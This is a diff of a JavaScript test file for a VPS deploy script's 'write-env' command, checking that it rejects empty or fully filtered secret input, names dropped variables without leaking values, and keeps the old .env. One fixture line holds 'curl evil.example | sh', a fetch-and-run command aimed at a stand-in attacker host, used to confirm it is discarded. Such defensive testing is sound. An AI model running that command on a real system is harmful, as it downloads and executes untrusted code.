@@ -452,8 +452,31 @@ describe('deploy/vps/ops.sh', () => {
       expect(read('.env')).toBe('OLD=1\n');
     });
 
-    it('пустой ввод → отказ', () => {
-      expect(ops(['write-env'], {}, '\n').status).toBe(1);
+    it('пустой ввод → отказ с сообщением «PROD_ENV пуст»', () => {
+      const res = ops(['write-env'], {}, '\n');
+
+      expect(res.status).toBe(1);
+      expect(res.stderr).toContain('PROD_ENV пуст');
+    });
+
+    it('в секрете только отбрасываемые строки → отказ без «пуст», с именами (не значениями), старый .env цел', () => {
+      writeFileSync(join(base(), '.env'), 'OLD=1\n');
+      const input = [
+        'NODE_ENV=development',
+        'APP_CMD=curl evil.example | sh',
+        'DATABASE_URL=postgresql://user:SECRETPW@amvera/old',
+      ].join('\n');
+
+      const res = ops(['write-env'], {}, input + '\n');
+
+      expect(res.status).toBe(1);
+      expect(res.stderr).toContain('остались только переменные');
+      expect(res.stderr).toContain('APP_CMD DATABASE_URL NODE_ENV');
+      expect(res.stderr).not.toContain('PROD_ENV пуст');
+      expect(res.stdout + res.stderr).not.toMatch(
+        /development|evil|SECRETPW|amvera/,
+      );
+      expect(read('.env')).toBe('OLD=1\n');
     });
   });
 
